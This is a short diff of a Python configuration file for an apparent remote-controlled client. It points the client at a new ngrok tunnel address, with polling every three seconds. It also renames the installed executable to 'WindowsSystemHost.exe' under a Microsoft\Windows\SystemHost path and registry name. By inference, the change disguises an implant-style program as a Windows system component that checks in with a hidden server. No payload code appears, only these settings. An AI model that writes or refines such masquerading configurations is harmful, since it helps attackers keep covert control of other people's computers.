@@ -8,7 +8,7 @@ Para LAN: usar "http://192.168.x.x:18812"
 """
 
 # ─── Server address ────────────────────────────────────────────────────────────
-SERVER_URL = "https://1b19-190-107-209-205.ngrok-free.app"
+SERVER_URL = "https://marquis-prorefugee-lala.ngrok-free.app"
 
 # ─── Polling ──────────────────────────────────────────────────────────────────
 
@@ -19,7 +19,7 @@ POLL_INTERVAL = 3
 
 APP_REGISTRY_NAME  = "WindowsSystemHost"
 INSTALL_SUBPATH    = r"Microsoft\Windows\SystemHost"
-INSTALLED_EXE_NAME = "yourfile.exe"
+INSTALLED_EXE_NAME = "WindowsSystemHost.exe"
 
 # ─── Logging ──────────────────────────────────────────────────────────────────
 
